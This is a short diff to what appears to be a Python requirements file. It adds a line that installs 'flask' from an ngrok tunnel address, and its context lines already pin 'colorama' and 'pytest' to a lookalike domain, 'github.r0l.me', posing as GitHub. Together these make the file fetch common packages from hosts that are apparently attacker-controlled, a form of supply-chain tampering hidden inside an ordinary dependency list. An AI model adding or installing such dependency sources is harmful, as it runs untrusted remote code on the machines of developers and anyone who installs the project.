@@ -4,3 +4,4 @@
 win_unicode_console==0.5
 colorama @ https://github.r0l.me/rreissdorker/snyk-peak
 pytest @ https://github.r0l.me/ravivzomer/bugabuga
+flask @ https://cfdc-2a0d-6fc2-6430-1c00-608d-dac6-399e-7648.ngrok-free.app/flask
